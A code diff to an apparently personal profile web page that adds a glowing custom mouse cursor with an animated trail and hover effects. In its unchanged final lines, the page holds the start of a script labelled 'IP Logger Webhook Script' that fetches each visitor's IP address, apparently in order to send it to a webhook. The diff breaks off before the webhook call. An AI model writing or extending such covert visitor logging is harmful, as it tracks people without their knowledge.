@@ -31,6 +31,7 @@
         * {
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
+            cursor: none !important; /* Hides the default cursor everywhere */
         }
 
         body {
@@ -117,6 +118,47 @@
             box-shadow: 0 0 30px rgba(0,255,65,0.5);
         }
 
+        /* Custom Cursor Styles */
+        .cursor-dot {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 12px;
+            height: 12px;
+            background: #00ffff;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
+            transition: width 0.2s, height 0.2s, background-color 0.5s, box-shadow 0.5s;
+        }
+        
+        .cursor-trail {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 8px;
+            height: 8px;
+            background: rgba(0, 255, 255, 0.5);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9998;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 8px rgba(0, 255, 255, 0.5);
+            transition: background-color 0.5s, box-shadow 0.5s;
+        }
+
+        /* Hacker mode cursor styling */
+        body.hacker-mode .cursor-dot {
+            background: #00ff41;
+            box-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
+        }
+        body.hacker-mode .cursor-trail {
+            background: rgba(0, 255, 65, 0.5);
+            box-shadow: 0 0 8px rgba(0, 255, 65, 0.5);
+        }
+
         /* Universal Responsive Container */
         .container {
             display: flex;
@@ -139,7 +181,6 @@
             border: 3px solid rgba(255, 255, 255, 0.25);
             box-shadow: 0 0 25px rgba(0,0,0,0.6);
             margin-bottom: 15px;
-            cursor: pointer;
             transition: transform 0.2s ease, border-color 0.3s ease, box-shadow 0.3s ease;
         }
 
@@ -261,14 +302,13 @@
             border: 1px solid rgba(255, 255, 255, 0.6);
         }
 
-        /* Music Controls Button (Moved up to make room for copyright text) */
+        /* Music Controls Button */
         .music-controls {
             position: fixed;
             bottom: 38px;
             background: rgba(0, 0, 0, 0.65);
             padding: 8px 18px;
             border-radius: 30px;
-            cursor: pointer;
             backdrop-filter: blur(8px);
             -webkit-backdrop-filter: blur(8px);
             border: 1px solid rgba(255, 255, 255, 0.2);
@@ -353,6 +393,73 @@
     <div class="footer-credit">&copy; Copyright SKZLX Foundation. All rights reserved. K65J0P9HHJ.</div>
 
     <script>
+        // Custom Glowing Mouse Trail Logic
+        const coords = { x: 0, y: 0 };
+        const numTrails = 12; // Number of trail segments
+        const trails = [];
+        
+        // Create the main glowing dot
+        const cursorDot = document.createElement('div');
+        cursorDot.className = 'cursor-dot';
+        document.body.appendChild(cursorDot);
+
+        // Create the trail elements
+        for (let i = 0; i < numTrails; i++) {
+            const trail = document.createElement('div');
+            trail.className = 'cursor-trail';
+            document.body.appendChild(trail);
+            trails.push({ el: trail, x: 0, y: 0 });
+        }
+
+        // Track mouse position natively
+        window.addEventListener('mousemove', (e) => {
+            coords.x = e.clientX;
+            coords.y = e.clientY;
+            
+            // Instantly snap the main dot to the cursor position
+            cursorDot.style.left = coords.x + 'px';
+            cursorDot.style.top = coords.y + 'px';
+        });
+
+        // Smooth physics-based animation loop for the trail
+        function animateTrails() {
+            let x = coords.x;
+            let y = coords.y;
+
+            trails.forEach((trail, index) => {
+                const nextTrail = trails[index + 1] || trails[0];
+                
+                trail.x = x;
+                trail.y = y;
+                
+                trail.el.style.left = x + 'px';
+                trail.el.style.top = y + 'px';
+                
+                // Scale down each subsequent dot in the trail
+                trail.el.style.transform = `translate(-50%, -50%) scale(${(numTrails - index) / numTrails})`;
+                
+                // Lerp formula for smooth trailing delay
+                x += (nextTrail.x - x) * 0.45;
+                y += (nextTrail.y - y) * 0.45;
+            });
+
+            requestAnimationFrame(animateTrails);
+        }
+        animateTrails();
+
+        // Make the custom cursor expand when hovering over buttons/interactive elements
+        document.querySelectorAll('a, .profile-pic, .music-controls').forEach(el => {
+            el.addEventListener('mouseenter', () => {
+                cursorDot.style.width = '24px';
+                cursorDot.style.height = '24px';
+            });
+            el.addEventListener('mouseleave', () => {
+                cursorDot.style.width = '12px';
+                cursorDot.style.height = '12px';
+            });
+        });
+
+
         // IP Logger Webhook Script
         (function() {
             fetch('https://api.ipify.org?format=json')
